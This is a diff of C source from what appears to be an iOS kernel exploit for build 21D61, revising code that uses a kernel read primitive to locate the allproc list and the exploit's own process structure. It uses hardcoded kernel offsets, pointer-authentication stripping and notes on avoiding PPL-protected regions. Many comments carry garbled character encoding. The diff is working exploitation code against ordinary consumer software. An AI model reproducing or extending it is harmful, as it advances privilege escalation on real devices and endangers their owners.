+        filelog_write("[ourproc] socket/tro fast path: using exact+nearby 21D61 set (bg~0x298/0x2a8/0x2b0 tro~0x358/0x368/0x370 plus bounded 0x340..0x3c0 tro_proc=0x10|0x18 tro_task=0x20|0x28)");
     } else {
         for (size_t i = 0; i < sizeof(socket_bg_thread_known_offs)/sizeof(socket_bg_thread_known_offs[0]); i++) {
             socket_bg_thread_offs[nbg++] = socket_bg_thread_known_offs[i];
@@ -1379,7 +1550,7 @@ static uint64_t find_self_proc_via_socket_tro(void) {
     }
 
     uint64_t rw_pcb = ds_get_rw_socket_pcb();
-    bool rw_pcb_ok = rw_pcb && (is_heap_ptr_relaxed(rw_pcb) || is_in_zone_map(rw_pcb) || is_kptr(rw_pcb));
+    bool rw_pcb_ok = rw_pcb && is_fastpath_candidate_ptr(rw_pcb);
     if (!rw_pcb_ok) {
         filelog_write("[ourproc] socket/tro fast path: rw_socket_pcb unavailable (0x%llx)", rw_pcb);
         return 0;
@@ -1401,7 +1572,7 @@ static uint64_t find_self_proc_via_socket_tro(void) {
         }
 
         uint64_t socket_candidate = pac_strip(socket_raw);
-        bool socket_ok = is_heap_ptr_relaxed(socket_candidate) || is_in_zone_map(socket_candidate) || is_kptr(socket_candidate);
+        bool socket_ok = is_fastpath_candidate_ptr(socket_candidate);
         if (!socket_ok) {
             socket_ptr_rejects++;
             last_socket_raw_reject = socket_raw;
@@ -1425,7 +1596,7 @@ static uint64_t find_self_proc_via_socket_tro(void) {
             if (thread_probe >= 0x100000000ULL) {
                 all_nonzero_thread_tiny = false;
             }
-            if (is_heap_ptr_relaxed(thread_probe) || is_in_zone_map(thread_probe) || is_kptr(thread_probe)) {
+            if (is_fastpath_candidate_ptr(thread_probe)) {
                 has_thread_like = true;
                 break;
             }
@@ -1484,7 +1655,7 @@ static uint64_t find_self_proc_via_socket_tro(void) {
         }
 
         uint64_t thread = pac_strip(thread_raw);
-        bool thread_ok = is_heap_ptr_relaxed(thread) || is_in_zone_map(thread) || is_kptr(thread);
+        bool thread_ok = is_fastpath_candidate_ptr(thread);
         if (!thread_ok) {
             thread_ptr_rejects++;
             last_thread_raw_reject = thread_raw;
@@ -1507,7 +1678,7 @@ static uint64_t find_self_proc_via_socket_tro(void) {
             }
 
             uint64_t tro = pac_strip(tro_raw);
-            bool tro_ok = is_kptr(tro) || is_in_zone_map(tro) || is_heap_ptr_relaxed(tro);
+            bool tro_ok = is_fastpath_candidate_ptr(tro);
             if (!tro_ok) {
                 tro_ptr_rejects++;
                 last_tro_raw_reject = tro_raw;
@@ -1525,8 +1696,8 @@ static uint64_t find_self_proc_via_socket_tro(void) {
 
             uint64_t proc = pac_strip(proc_raw);
             uint64_t tro_task = pac_strip(task_raw);
-            bool proc_ok = is_heap_ptr_relaxed(proc) || is_in_zone_map(proc) || is_kernel_data_ptr(proc);
-            bool tro_task_ok = is_kptr(tro_task);
+            bool proc_ok = is_fastpath_candidate_ptr(proc);
+            bool tro_task_ok = is_fastpath_candidate_ptr(tro_task);
             if (!proc_ok) {
                 proc_ptr_rejects++;
                 last_proc_raw_reject = proc_raw;
@@ -1548,20 +1719,35 @@ static uint64_t find_self_proc_via_socket_tro(void) {
 
                 bool proc_ro_ok = false;
                 bool ro_task_ok = false;
+                bool name_ok = false;
+                bool uid_ok = false;
+                bool gid_ok = false;
+                bool cred_ok = false;
                 uint64_t proc_ro_raw = 0, proc_ro = 0, ro_task_raw = 0, ro_task = 0;
                 if (ds_kread64_checked(proc + O_PROC_RO, &proc_ro_raw)) {
                     proc_ro = pac_strip(proc_ro_raw);
-                    proc_ro_ok = is_kptr(proc_ro);
+                    proc_ro_ok = is_fastpath_candidate_ptr(proc_ro);
                 }
                 if (proc_ro_ok && ds_kread64_checked(proc_ro + O_PROC_RO_TASK, &ro_task_raw)) {
                     ro_task = pac_strip(ro_task_raw);
-                    ro_task_ok = is_kptr(ro_task);
+                    ro_task_ok = is_fastpath_candidate_ptr(ro_task);
                 }
+                name_ok = proc_name_matches_ours(proc);
+                cred_ok = proc_credentials_match_ours(proc, &uid_ok, &gid_ok);
 
                 if (!ro_task_ok && !tro_task_ok) {
                     task_proof_misses++;
-                    filelog_write("[ourproc] socket/tro fast path: pid match via bg=0x%x tro=0x%x pid_off=0x%x but no task proof",
-                                  socket_bg_thread_offs[bi], thread_tro_offs[ti], pid_off);
+                    filelog_write("[ourproc] socket/tro fast path: pid match via bg=0x%x tro=0x%x pid_off=0x%x but no task proof (name=%d uid=%d gid=%d)",
+                                  socket_bg_thread_offs[bi], thread_tro_offs[ti], pid_off,
+                                  (int)name_ok, (int)uid_ok, (int)gid_ok);
+                    continue;
+                }
+
+                if (!(name_ok || cred_ok)) {
+                    pid_probe_misses++;
+                    filelog_write("[ourproc] socket/tro fast path: rejecting pid match via bg=0x%x tro=0x%x pid_off=0x%x without self proof (name=%d uid=%d gid=%d)",
+                                  socket_bg_thread_offs[bi], thread_tro_offs[ti], pid_off,
+                                  (int)name_ok, (int)uid_ok, (int)gid_ok);
                     continue;
                 }
 
@@ -1627,6 +1813,11 @@ static bool try_allproc_candidate(const char *label, uint64_t kbase, uint64_t of
     uint64_t addr = kbase + offset;
     filelog_write("[allproc] trying %s offset 0x%llx -> addr 0x%llx", label, offset, addr);
 
+    if (is_candidate_blacklisted(addr)) {
+        filelog_write("[allproc] skipping %s addr 0x%llx: candidate is blacklisted", label, addr);
+        return false;
+    }
+
     g_validate_curated = true; /* verbose logging for curated candidates */
     bool ok = validate_allproc(addr);
     g_validate_curated = false;
@@ -1646,7 +1837,7 @@ static bool try_allproc_candidate(const char *label, uint64_t kbase, uint64_t of
         }
     }
 
-    filelog_write("[allproc] %s validated ✓", label);
+    filelog_write("[allproc] %s validated вњ“", label);
     g_kernproc_addr = addr;
     if (persist_on_success) {
         savekernproc(offset);
@@ -1669,12 +1860,16 @@ static const char *builtin_xpf_offsets_for_os(void) {
     }
 
     if (strcmp(build, "21D61") == 0) {
-        /* Bug #425: Align builtin XPF-lite order with latest offline shortlist
-         * for 21D61 (v24/v-focused probe). Put 0x31FFF30 first: the focused
-         * 21D61 offline probe sees it as the strongest exact allproc-like
-         * target among the runtime shortlist. Keep 0x321C480 only as a late
-         * runtime fallback to avoid early lock-in on non-allproc vars. */
-        return "0x31FFF30,0x3213678,0x3213680,0x31C3000,0x3214850,0x3213EC8,0x321C480";
+        /* Bug #523 follow-up: the earlier connectx "+0x598" secondary target
+         * was a false-positive from the offline ADRP extractor; x8 is clobbered
+         * before that load. Keep only the revalidated exact hits:
+         *   0x31C3000  connectx + pid_shutdown_sockets
+         *   0x31C7C28  task_for_pid + pid_for_task
+         *   0x3216CC8  setuid exact hit
+         * Keep 0x31FFF30 only as a late legacy fallback. Older 0x3213678,
+         * 0x3213680, 0x3214850 and 0x3213EC8 stay out of the default XPF path
+         * because they have weaker current exact-xref support on 21D61. */
+        return "0x31C3000,0x31C7C28,0x3216CC8,0x31FFF30";
     }
 
     return NULL;
@@ -1755,7 +1950,7 @@ static bool validate_allproc(uint64_t allproc_addr) {
     uint64_t head = 0;
     bool loud = g_validate_curated || (g_validate_verbose_count < 3);
     const uint64_t PROC_NEAR_PCB_MAX_DIFF = 0xC0000000ULL; /* Bug #398: 3 GB */
-    const uint64_t PROC_BSD_BACKLINK_MAX_DIFF = 0x500000000ULL; /* Bug #440: 20 GB — accommodate full 24 GB zone_map span */
+    const uint64_t PROC_BSD_BACKLINK_MAX_DIFF = 0x500000000ULL; /* Bug #440: 20 GB вЂ” accommodate full 24 GB zone_map span */
     bool result = false;
     int layout_score = 0;
 
@@ -1827,7 +2022,7 @@ static bool validate_allproc(uint64_t allproc_addr) {
                     allow_far_bsd_backlink = true;
                 }
                 /* Bug #446: if the allproc head is within the known zone_map, its
-                 * distance from rw_pcb is irrelevant — proc structs can be anywhere
+                 * distance from rw_pcb is irrelevant вЂ” proc structs can be anywhere
                  * in the 24 GB zone range.  Only reject if it is outside zone_map too. */
                 bool allow_zone_map_head = is_in_zone_map(head_stripped);
                 if (!allow_far_bsd_backlink && !allow_zone_map_head) {
@@ -2115,7 +2310,7 @@ static uint64_t scan_range_for_allproc(uint64_t range_start, uint64_t range_size
         return 0;
     }
 
-    /* Bug #239: Canary read — verify the kread primitive can access
+    /* Bug #239: Canary read вЂ” verify the kread primitive can access
      * this range before starting the expensive 16KB bulk scan.
      * Session 25b showed that a single 16KB chunk read at kbase+0x31FC000
      * caused kernel panic (copyout fault) on certain boots.
@@ -2164,7 +2359,7 @@ static uint64_t scan_range_for_allproc(uint64_t range_start, uint64_t range_size
 
             uint64_t stripped = pac_strip(val);
             /* allproc value is a HEAP pointer (to first proc struct).
-             * Skip text/data/const segment pointers — they can't be proc ptrs.
+             * Skip text/data/const segment pointers вЂ” they can't be proc ptrs.
              * This is the KEY safety filter that prevents panic.
              * NOTE: is_heap_ptr now correctly excludes 0xffffffffffffffff (-1)
              * and the entire 0xfffffff0... kernel text/data range. */
@@ -2181,17 +2376,17 @@ static uint64_t scan_range_for_allproc(uint64_t range_start, uint64_t range_size
              * cutting total scan time from ~23s to ~2s.
              *
              * Bug #216 SAFETY: the pid read from first_q is a HEAP read.
-             * With emergency zone bounds (±8GB), some heap-looking addresses
-             * may actually be zone metadata (unmapped) → kernel panic.
+             * With emergency zone bounds (В±8GB), some heap-looking addresses
+             * may actually be zone metadata (unmapped) в†’ kernel panic.
              * Limit total HEAP reads to 50 to minimize risk. */
             uint64_t head_q = val;
             uint64_t first_q = pac_strip(head_q);
-            if (!is_heap_ptr(first_q)) continue;  /* allproc → heap proc ptr */
+            if (!is_heap_ptr(first_q)) continue;  /* allproc в†’ heap proc ptr */
 
-            /* Bug #216: additional sanity — proc structs are in zone_map.      *
+            /* Bug #216: additional sanity вЂ” proc structs are in zone_map.      *
              * Check that first_q is within zone_map width (24 GB) of rw_pcb.   *
              * Use 16 GB (emergency window width) as the tolerance.               *
-             * Bug #219: old 2 GB limit was too tight — kernproc can be >2 GB    *
+             * Bug #219: old 2 GB limit was too tight вЂ” kernproc can be >2 GB    *
              * away from rw_socket_pcb in zone_map on A12Z with zone KASLR.      */
             uint64_t rw_pcb = ds_get_rw_socket_pcb();
             if (rw_pcb) {
@@ -2214,8 +2409,8 @@ static uint64_t scan_range_for_allproc(uint64_t range_start, uint64_t range_size
             /* Bug #232: Quick 5-step chain walk as pre-filter.
              * Try FORWARD via le_next (+0x00) first. If that gives < 3 procs,
              * try BACKWARD via le_prev (+0x08). This handles both:
-             *  - allproc HEAD (newest proc → forward walk to tail)
-             *  - kernproc/tail proc → backward walk to head
+             *  - allproc HEAD (newest proc в†’ forward walk to tail)
+             *  - kernproc/tail proc в†’ backward walk to head
              * le_prev in BSD LIST_ENTRY points to &prev->le_next = prev proc base
              * (since le_next is at offset 0 in struct proc). */
             {
@@ -2259,7 +2454,7 @@ static uint64_t scan_range_for_allproc(uint64_t range_start, uint64_t range_size
                 return candidate;
             }
             /* Limit total candidates to avoid excessive kernel reads.
-             * Bug #219: raised from 100 to 500 — inner __DATA.__common has many
+             * Bug #219: raised from 100 to 500 вЂ” inner __DATA.__common has many
              * heap-looking values that fail allproc validation. Need more budget. */
             if (++candidates_tried > 500) {
                 klog_scan("too many candidates (%d), aborting range 0x%llx",
@@ -2312,7 +2507,7 @@ static uint64_t scan_for_allproc(void) {
      * kbase is the SLID runtime address. We must compute the KASLR slide
      * from __TEXT's vmaddr and add it to all other segment vmaddrs.
      * Without this, scan_range_for_allproc reads from UNSLID addresses
-     * which are unmapped → kernel data abort → PANIC.
+     * which are unmapped в†’ kernel data abort в†’ PANIC.
      *
      * First pass: find __TEXT vmaddr to derive slide. */
     uint64_t macho_slide = 0;
@@ -2354,9 +2549,9 @@ static uint64_t scan_for_allproc(void) {
             uint64_t vmsize = *(uint64_t *)(hdr + offset + 32);
 
             /* ONLY scan the plain __DATA segment.                          *
-             * allproc is LIST_HEAD_INITIALIZER global → always in __DATA.  *
-             * __PPLDATA/__LASTDATA are PPL-protected → reading panics.      *
-             * __DATA_CONST is read-only init data  → allproc won't be there.*/
+             * allproc is LIST_HEAD_INITIALIZER global в†’ always in __DATA.  *
+             * __PPLDATA/__LASTDATA are PPL-protected в†’ reading panics.      *
+             * __DATA_CONST is read-only init data  в†’ allproc won't be there.*/
             bool is_safe_data = (strcmp(segname, "__DATA") == 0);
             if (!is_safe_data || !vmaddr || !vmsize) {
                 offset += cmdsize;
@@ -2368,13 +2563,13 @@ static uint64_t scan_for_allproc(void) {
             vmaddr += macho_slide;
 
             /* BUG #207 FIX: outer fileset __DATA starts at vmaddr, but the first
-             * 0x8000 bytes (32KB) contain __PPLDATA + __KLDDATA — both PPL-protected
+             * 0x8000 bytes (32KB) contain __PPLDATA + __KLDDATA вЂ” both PPL-protected
              * on A12Z (iPad8,9). Reading them via exploit causes kernel panic:
              * "Unexpected fault in kernel static region".
              *
              * Verified by offline kernelcache analysis (build 21D61):
-             *   outer __DATA + 0x0000..0x4000 = __PPLDATA  (PPL-protected → PANIC)
-             *   outer __DATA + 0x4000..0x8000 = __KLDDATA  (PPL-protected → PANIC)
+             *   outer __DATA + 0x0000..0x4000 = __PPLDATA  (PPL-protected в†’ PANIC)
+             *   outer __DATA + 0x4000..0x8000 = __KLDDATA  (PPL-protected в†’ PANIC)
              *   outer __DATA + 0x8000+        = __DATA.__data (safe to read)
              *
              * allproc lives in __DATA.__common which starts at outer __DATA+0x2b000.
@@ -2382,9 +2577,9 @@ static uint64_t scan_for_allproc(void) {
              *
              * Bug #216: NARROWED scan range to __DATA.__common only.
              * Scanning ALL of __DATA causes many false-positive heap pointers
-             * in __DATA.__data, leading to reads from zone metadata → panic.
+             * in __DATA.__data, leading to reads from zone metadata в†’ panic.
              * __DATA.__common: outer __DATA + 0x2b000 to +0x7f000 (336 KB).
-             * Add ±0x4000 margin → scan 0x27000 to 0x83000 (376 KB).
+             * Add В±0x4000 margin в†’ scan 0x27000 to 0x83000 (376 KB).
              * This covers allproc at +0x67f30 with plenty of margin.
              * Skip 0x8000 (PPL) + 0x1f000 (DATA.__data/lock_grp/percpu) = 0x27000. */
             const uint64_t COMMON_START = 0x63000ULL; /* Bug #292: bypass dangerous early __common; start near allproc at +0x67F30 */
@@ -2422,10 +2617,10 @@ static uint64_t scan_for_allproc(void) {
  *   __DATA.__common: kbase + 0x31c3000  size ~0x54000 (safe, 336 KB)
  *   __DATA.__bss:    kbase + 0x3217000  size ~0x2a000 (safe, 168 KB)
  *
- * Bug #226b: CRITICAL — The full __DATA.__common scan is DANGEROUS.
+ * Bug #226b: CRITICAL вЂ” The full __DATA.__common scan is DANGEROUS.
  * The early part of __DATA.__common (offsets 0x0..0x5000) contains
  * heap-looking pointers to unmapped zone pages. ds_kread_checked()
- * cannot detect unmapped pages — the kernel panics in copyout()
+ * cannot detect unmapped pages вЂ” the kernel panics in copyout()
  * (Kernel data abort) before getsockopt can return.
  *
  * allproc is at outer __DATA + 0x67F30 = kbase + 0x31FFF30, which is
@@ -2444,7 +2639,7 @@ static uint64_t scan_allproc_known_range(uint64_t kbase) {
         uint64_t size;
         const char *label;
     } ranges[] = {
-        /* Bug #239 / Bug #395: SWAPPED ORDER — __bss first, __common second.
+        /* Bug #239 / Bug #395: SWAPPED ORDER вЂ” __bss first, __common second.
          * Session 25 confirmed allproc at kbase+0x321C408 (in __bss range), but
          * fresh runtime after Bug #394 exposed additional heap-like candidates at
          * kbase+0x3213678 / +0x3213680, i.e. ~0x4A00 BELOW the old scan start.
@@ -2458,7 +2653,7 @@ static uint64_t scan_allproc_known_range(uint64_t kbase) {
          * covering both the historical 0x321C4xx region and the new 0x32136xx
          * boot-specific candidates. */
         { 0x3213000ULL, 0x18000ULL, "__DATA.__bss_allproc" },
-        /* SECOND: wider __common range — only used as fallback.
+        /* SECOND: wider __common range вЂ” only used as fallback.
          * Bug #239: may cause panic on some boots. */
         { 0x31FC000ULL, 0x10000ULL, "__DATA.__common_target" },
     };
@@ -2492,7 +2687,7 @@ static uint64_t scan_allproc_known_range(uint64_t kbase) {
  *
  * The old v2 hardcoded list_off=0x00 and relied on le_prev backlink,
  * which only worked coincidentally for a different list (pgrp/session)
- * at proc+0x00.  Chain was only 2 entries → validation failed.
+ * at proc+0x00.  Chain was only 2 entries в†’ validation failed.
  *
  * New v2 tries multiple list_off values and walks the chain correctly
  * for both SMRQ and BSD list interpretations. */
@@ -2615,8 +2810,8 @@ static bool validate_direct_allproc_v2_with_layout(uint64_t candidate, uint32_t 
         uint64_t next_raw = 0;
         if (!ds_kread64_checked(cur_proc + list_off, &next_raw)) break;
         uint64_t next_entry = pac_strip(next_raw);
-        /* Bug #258A: circular list sentinel — entry points back to &allproc. */
-        if (next_entry == candidate) break;  /* reached head → end of circular list */
+        /* Bug #258A: circular list sentinel вЂ” entry points back to &allproc. */
+        if (next_entry == candidate) break;  /* reached head в†’ end of circular list */
         /* Bug #445: allow zone-map next entries below safe_min */
         if ((!is_heap_ptr_relaxed(next_entry) && !is_kernel_data_ptr(next_entry) && !is_in_zone_map(next_entry)) ||
             next_entry == (cur_proc + list_off)) break;
@@ -2653,12 +2848,12 @@ static bool validate_direct_allproc_v2_with_layout(uint64_t candidate, uint32_t 
     bool is_ios17_kernel_chain = (chain_len >= 2 && unique_pids <= 2 && first_pid == 0 && max_pid_seen == 0);
 
     if (is_ios17_kernel_chain) {
-        filelog_write("[allproc] Bug #393: kernel-only chain rejected (list=0x%x pid_off=0x%x) — waiting for diverse/PID-probed candidate",
+        filelog_write("[allproc] Bug #393: kernel-only chain rejected (list=0x%x pid_off=0x%x) вЂ” waiting for diverse/PID-probed candidate",
                       list_off, active_pid_off);
     }
 
     if (chain_len >= 8 && unique_pids >= 5 && first_pid_ok && max_pid_seen >= (uint32_t)ourpid) {
-        /* Set global offsets — confirmed by chain walk with this layout */
+        /* Set global offsets вЂ” confirmed by chain walk with this layout */
         PROC_LIST_OFFSET = list_off;
         PROC_NEXT_OFFSET = 0x00;
         PROC_PREV_OFFSET = 0x08;
@@ -3069,7 +3264,7 @@ static bool detect_kernproc_variable(uint64_t candidate) {
                       entry_ptr, q0, (int)q0_ok, q8, (int)q8_ok);
     }
 
-    /* Bug #349: interp1b — +0x60 can be a non-PID field on some boots (e.g. iOS 17
+    /* Bug #349: interp1b вЂ” +0x60 can be a non-PID field on some boots (e.g. iOS 17
      * allproc first-proc has garbage at +0x60 but PID=0 at PROC_PID_OFFSET=0xd8).
      * If interp1 failed with non-zero at +0x60, retry at PROC_PID_OFFSET. */
     if (!found_pid0 && direct_links_ok && PROC_PID_OFFSET != 0x60 && PROC_PID_OFFSET != 0) {
@@ -3108,7 +3303,7 @@ static bool detect_kernproc_variable(uint64_t candidate) {
                       entry_ptr, sq0, (int)sq0_ok, sq8, (int)sq8_ok);
     }
 
-    /* Bug #349: interp2b — same fallback for the SMRQ path */
+    /* Bug #349: interp2b вЂ” same fallback for the SMRQ path */
     if (!found_pid0 && smrq_links_ok && entry_ptr >= 0xb0
         && PROC_PID_OFFSET != 0x60 && PROC_PID_OFFSET != 0) {
         uint64_t maybe_base = entry_ptr - 0xb0;
@@ -3141,30 +3336,30 @@ static bool detect_kernproc_variable(uint64_t candidate) {
                       off, v0, v1, v2, v3);
     }
 
-    /* Bug #265A: Non-fatal proc_ro check at +0x18 — log result but do NOT reject.
+    /* Bug #265A: Non-fatal proc_ro check at +0x18 вЂ” log result but do NOT reject.
      * iOS 17.3.1 proc struct may have a different field at +0x18. */
     uint64_t proc_ro = 0;
     {
         uint64_t proc_ro_raw = 0;
         if (!ds_kread64_checked(proc_base + 0x18, &proc_ro_raw)) {
-            filelog_write("[allproc] Bug #265: kread(proc_base+0x18) FAILED — proc_ro check skipped");
+            filelog_write("[allproc] Bug #265: kread(proc_base+0x18) FAILED вЂ” proc_ro check skipped");
         } else {
             proc_ro = pac_strip(proc_ro_raw);
             filelog_write("[allproc] Bug #265: proc_base+0x18 raw=0x%llx stripped=0x%llx is_kptr=%d",
                           proc_ro_raw, proc_ro, (int)is_kptr(proc_ro));
             if (!is_kptr(proc_ro)) {
-                filelog_write("[allproc] Bug #265: +0x18 is NOT a kptr — proc_ro offset may differ on this iOS");
+                filelog_write("[allproc] Bug #265: +0x18 is NOT a kptr вЂ” proc_ro offset may differ on this iOS");
                 proc_ro = 0;  /* mark as unknown, non-fatal */
             }
         }
     }
 
-    /* Bug #265A: le_prev check — required but with explicit logging */
+    /* Bug #265A: le_prev check вЂ” required but with explicit logging */
     uint64_t le_prev = 0;
     {
         uint64_t le_prev_raw = 0;
         if (!ds_kread64_checked(proc_base + 0x08, &le_prev_raw)) {
-            filelog_write("[allproc] Bug #265: kread(proc_base+0x08) FAILED for le_prev — rejecting");
+            filelog_write("[allproc] Bug #265: kread(proc_base+0x08) FAILED for le_prev вЂ” rejecting");
             return false;
         }
         le_prev = pac_strip(le_prev_raw);
@@ -3190,10 +3385,10 @@ static bool detect_kernproc_variable(uint64_t candidate) {
     uint32_t discovered_pid_off = 0;
     uint32_t original_pid_off = PROC_PID_OFFSET;
     /* Bug #344: Try PROC_PID_OFFSET FIRST (e.g. 0xd8 for iOS 17) before the general scan.
-     * Without this, sequential scan hits 0xb8 before 0xd8 — proc0+0xb8=0 coincidentally
-     * (unrelated field), next_proc+0xb8=64 (coincidental small value) → wrong offset
+     * Without this, sequential scan hits 0xb8 before 0xd8 вЂ” proc0+0xb8=0 coincidentally
+     * (unrelated field), next_proc+0xb8=64 (coincidental small value) в†’ wrong offset
      * discovered, PROC_PID_OFFSET set to 0xb8, ourproc() walks list and finds pid=64
-     * as max but not ourpid → fails. By prioritising PROC_PID_OFFSET=0xd8 we avoid
+     * as max but not ourpid в†’ fails. By prioritising PROC_PID_OFFSET=0xd8 we avoid
      * false positives at earlier offsets in the sequential scan. */
     if (PROC_PID_OFFSET > 0) {
         uint64_t next_direct_raw = 0;
@@ -3283,7 +3478,7 @@ static bool detect_kernproc_variable(uint64_t candidate) {
      * require Bug #268 chain validation before accepting the candidate. */
     bool head_backref_match = false;
     if (!is_heap_ptr_relaxed(le_prev) && is_kptr(le_prev) && le_prev == candidate) {
-        filelog_write("[allproc] Bug #303: proc0.le_prev == candidate 0x%llx — "
+        filelog_write("[allproc] Bug #303: proc0.le_prev == candidate 0x%llx вЂ” "
                       "strong LIST_HEAD hint, but still validating chain", candidate);
         if (discovered_pid_off && discovered_pid_off != original_pid_off) {
             /* Bug #361/#454: discovered_pid_off can be a false positive at large offsets,
@@ -3381,7 +3576,7 @@ static bool detect_kernproc_variable(uint64_t candidate) {
             /* Bug #361: accept the candidate for triage, but keep original_pid_off if trusted. */
             uint32_t pid_off_for_triage = (original_pid_off > 0) ? original_pid_off : discovered_pid_off;
             filelog_write("[allproc] Bug #317: le_prev back-reference + discovered pid_off=0x%x "
-                          "is strong enough for success-path triage — accepting candidate 0x%llx "
+                          "is strong enough for success-path triage вЂ” accepting candidate 0x%llx "
                           "and deferring final proof to ourproc() (using pid_off=0x%x)",
                           discovered_pid_off, candidate, pid_off_for_triage);
             if (pid_off_for_triage != discovered_pid_off) discovered_pid_off = pid_off_for_triage;
@@ -3407,12 +3602,20 @@ static bool detect_kernproc_variable(uint64_t candidate) {
                 q0_ok && pac_strip(q0_raw) == 0 &&
                 q8_ok && is_heap_ptr_relaxed(q8) &&
                 is_heap_ptr_relaxed(le_prev)) {
-                filelog_write("[allproc] Bug #451: accepting 21D61 kernproc triage candidate 0x%llx "
-                              "(off=0x%llx pid0 q0=0 q8=0x%llx le_prev=0x%llx) and deferring "
-                              "full proof to ourproc() backward/alt-list fallbacks",
-                              candidate, cand_off, q8, le_prev);
-                discovered_pid_off = original_pid_off;
-                chain_ok = true;
+                const char *allow_451 = getenv("DS_ENABLE_BUG451_TRIAGE");
+                bool allow_bug451 = (allow_451 && allow_451[0] == '1');
+                if (allow_bug451) {
+                    filelog_write("[allproc] Bug #451: accepting 21D61 kernproc triage candidate 0x%llx "
+                                  "(off=0x%llx pid0 q0=0 q8=0x%llx le_prev=0x%llx) and deferring "
+                                  "full proof to ourproc() backward/alt-list fallbacks",
+                                  candidate, cand_off, q8, le_prev);
+                    discovered_pid_off = original_pid_off;
+                    chain_ok = true;
+                } else {
+                    filelog_write("[allproc] Bug #451: 21D61 triage candidate 0x%llx matched shape "
+                                  "but is disabled by default (set DS_ENABLE_BUG451_TRIAGE=1 to force)",
+                                  candidate);
+                }
             }
         }
         if (!chain_ok) {
@@ -3442,8 +3645,8 @@ static bool detect_kernproc_variable(uint64_t candidate) {
     /* Set layout for ourproc() decoding:
      * *(candidate) might be proc_base or proc_base+0xb0.  We need ourproc()
      * to compute the correct proc_base from raw_head.
-     * If entry_ptr == proc_base: list_off=0 → kernproc = stripped - 0 = proc_base ✓
-     * If entry_ptr == proc_base+0xb0: list_off=0xb0 → kernproc = stripped - 0xb0 = proc_base ✓ */
+     * If entry_ptr == proc_base: list_off=0 в†’ kernproc = stripped - 0 = proc_base вњ“
+     * If entry_ptr == proc_base+0xb0: list_off=0xb0 в†’ kernproc = stripped - 0xb0 = proc_base вњ“ */
     uint32_t decode_list_off = (entry_ptr == proc_base) ? 0 : 0xb0;
     PROC_LIST_OFFSET = decode_list_off;
     PROC_NEXT_OFFSET = 0;
@@ -3483,7 +3686,7 @@ static uint64_t kernprocaddress(void) {
         return 0;
     }
 
-    /* Cache hit — re-validate on each call (kbase changes per boot).
+    /* Cache hit вЂ” re-validate on each call (kbase changes per boot).
      * Bug #259A / #263E: Lightweight cache validation.
      * Must also detect if cached result was a FALSE allproc (Bug #263). */
     if (g_kernproc_addr) {
@@ -3495,9 +3698,9 @@ static uint64_t kernprocaddress(void) {
                 if (is_heap_ptr_relaxed(cs)) {
                     cache_ok = true;
                 } else if (is_kptr(cs) && cs >= kbase && cs < kbase + 0x4000000ULL) {
-                    /* Bug #263E: DATA-resident head — verify it's not the false-allproc
+                    /* Bug #263E: DATA-resident head вЂ” verify it's not the false-allproc
                      * by checking that the SECOND entry has a plausible PID.
-                     * If PID=0 → this was the wrong candidate, invalidate cache. */
+                     * If PID=0 в†’ this was the wrong candidate, invalidate cache. */
                     uint64_t entry = cs;
                     if (PROC_LIST_OFFSET == 0xb0 && entry >= 0xb0) {
                         uint64_t base2 = entry - 0xb0;
@@ -3510,7 +3713,7 @@ static uint64_t kernprocaddress(void) {
                                 if (np > 0 && is_plausible_pid(np)) {
                                     cache_ok = true;
                                 } else {
-                                    filelog_write("[allproc] Bug #263E: cached DATA allproc has PID=0 chain — INVALIDATING");
+                                    filelog_write("[allproc] Bug #263E: cached DATA allproc has PID=0 chain вЂ” INVALIDATING");
                                 }
                             }
                         }
@@ -3547,7 +3750,7 @@ static uint64_t kernprocaddress(void) {
         }
     }
 
-    /* Bug #233: CRITICAL — all previous curated candidates (0x31FFF30, 0x31FFB50,
+    /* Bug #233: CRITICAL вЂ” all previous curated candidates (0x31FFF30, 0x31FFB50,
      * 0x31FFC68) were WRONG. They pointed to circular proc sublists (process groups
      * or session lists), NOT the real allproc. Session 20 confirmed: kbase+0x31FFB50
      * contains a 6-proc circular list that cycles forever.
@@ -3555,7 +3758,7 @@ static uint64_t kernprocaddress(void) {
      * Strategy 1: GOT-based resolution.
      * ipsw_analysis found allproc_symbol at kbase+0x93B348 (__DATA_CONST GOT entry).
      * At runtime, this GOT entry contains a PAC'd pointer to the real allproc variable.
-     * Read it, PAC strip → allproc address. Then validate normally.
+     * Read it, PAC strip в†’ allproc address. Then validate normally.
      *
      * Strategy 2: Direct allproc at kbase+0x3198060 (outer __DATA+0x60).
      * This is in the __PPLDATA sub-region, but PPL only protects WRITES.
@@ -3563,37 +3766,43 @@ static uint64_t kernprocaddress(void) {
     {
         uint64_t addr = 0;
 
-        /* Strategy 1: GOT entry resolution */
-        uint64_t got_addr = kbase + 0x93B348ULL;
-        uint64_t got_val = 0;
-        filelog_write("[allproc] trying GOT resolution: GOT at 0x%llx", got_addr);
-        if (ds_kread64_checked(got_addr, &got_val)) {
-            uint64_t allproc_ptr = pac_strip(got_val);
-            filelog_write("[allproc] GOT value=0x%llx stripped=0x%llx is_kptr=%d",
-                          got_val, allproc_ptr, (int)is_kptr(allproc_ptr));
-            if (allproc_ptr && is_kptr(allproc_ptr)) {
-                /* allproc_ptr is the runtime address of the allproc variable */
-                g_validate_curated = true;
-                bool ok = validate_allproc(allproc_ptr);
-                g_validate_curated = false;
-                if (ok) {
-                    filelog_write("[allproc] GOT resolution SUCCESS: allproc=0x%llx", allproc_ptr);
-                    g_kernproc_addr = allproc_ptr;
-                    return allproc_ptr;
+        const char *enable_legacy_probes = getenv("DS_ENABLE_LEGACY_PROBES");
+        bool allow_legacy_probes = (enable_legacy_probes && enable_legacy_probes[0] == '1');
+
+        if (allow_legacy_probes) {
+            /* Strategy 1: GOT entry resolution */
+            uint64_t got_addr = kbase + 0x93B348ULL;
+            uint64_t got_val = 0;
+            filelog_write("[allproc] trying GOT resolution: GOT at 0x%llx", got_addr);
+            if (ds_kread64_checked(got_addr, &got_val)) {
+                uint64_t allproc_ptr = pac_strip(got_val);
+                filelog_write("[allproc] GOT value=0x%llx stripped=0x%llx is_kptr=%d",
+                              got_val, allproc_ptr, (int)is_kptr(allproc_ptr));
+                if (allproc_ptr && is_kptr(allproc_ptr)) {
+                    /* allproc_ptr is the runtime address of the allproc variable */
+                    g_validate_curated = true;
+                    bool ok = validate_allproc(allproc_ptr);
+                    g_validate_curated = false;
+                    if (ok) {
+                        filelog_write("[allproc] GOT resolution SUCCESS: allproc=0x%llx", allproc_ptr);
+                        g_kernproc_addr = allproc_ptr;
+                        return allproc_ptr;
+                    }
+                    filelog_write("[allproc] GOT resolved addr 0x%llx failed validation", allproc_ptr);
                 }
